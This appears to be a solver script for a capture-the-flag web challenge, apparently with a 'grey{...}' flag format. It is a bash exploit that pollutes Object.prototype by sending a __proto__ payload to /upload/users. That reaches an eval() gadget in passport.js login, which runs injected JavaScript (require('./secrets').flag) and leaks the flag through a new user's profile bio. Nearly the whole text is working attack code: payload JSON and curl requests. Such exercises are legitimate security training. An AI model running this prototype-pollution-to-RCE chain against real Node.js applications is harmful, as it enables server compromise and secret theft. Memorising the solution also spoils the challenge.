#!/usr/bin/env bash
# Pollution solver: prototype pollution (merge in /upload/users) -> pollute
# Object.prototype.userAutoCreateTemplate -> eval() RCE gadget in passport.js
# authenticate() -> exfiltrate secrets.flag into a newly-created user's bio,
# then read it back from /profile.
#
# Usage: ./solve.sh [BASE_URL]   (default http://127.0.0.1:13000)
set -euo pipefail
BASE="${1:-http://127.0.0.1:13000}"
JAR="$(mktemp)"
WORK="$(mktemp -d)"
trap 'rm -rf "$JAR" "$WORK"' EXIT

PWUSER="pwn$RANDOM"          # non-existent user -> triggers auto-create gadget
PWPASS="pwpass1"

# Template literal evaluated by passport.js inside backticks. ${...} runs JS in
# the module scope where require() is available. We grab the flag from secrets
# and emit a JSON user object whose bio carries the flag.
TEMPLATE='{\"username\":\"'"$PWUSER"'\",\"bio\":\"${require(\"./secrets\").flag}\"}'

# 1) Pollute Object.prototype.userAutoCreateTemplate via the unguarded recursive
#    merge() reached when importing a user matching an existing lcUsername (alice).
cat > "$WORK/payload.json" <<EOF
[
  {
    "lcUsername": "alice",
    "__proto__": { "userAutoCreateTemplate": "$TEMPLATE" }
  }
]
EOF

echo "[*] Polluting Object.prototype.userAutoCreateTemplate ..."
curl -s -o /dev/null -w '  upload status: %{http_code}\n' \
  -F "upload-users=@$WORK/payload.json;type=application/json" \
  "$BASE/upload/users"

# 2) Trigger the gadget: log in as a NON-existent user -> eval() runs the
#    polluted template -> creates a user whose bio = flag -> session established.
echo "[*] Triggering eval() gadget via login of non-existent user '$PWUSER' ..."
curl -s -c "$JAR" -o /dev/null -w '  login status: %{http_code}\n' \
  --data-urlencode "username=$PWUSER" \
  --data-urlencode "password=$PWPASS" \
  -e "$BASE/login" \
  "$BASE/login"

# 3) Read the flag back from the rendered profile page.
echo "[*] Reading /profile ..."
PROFILE="$(curl -s -b "$JAR" "$BASE/profile")"
FLAG="$(printf '%s' "$PROFILE" | grep -oE 'grey\{[^}]*\}' | head -1 || true)"

if [ -n "$FLAG" ]; then
  echo "[+] FLAG: $FLAG"
  printf '%s\n' "$FLAG" > "$(dirname "$0")/flag.txt"
else
  echo "[-] Flag not found in profile. Raw profile bio section:"
  printf '%s\n' "$PROFILE" | grep -iE 'bio|grey' || true
  exit 1
fi
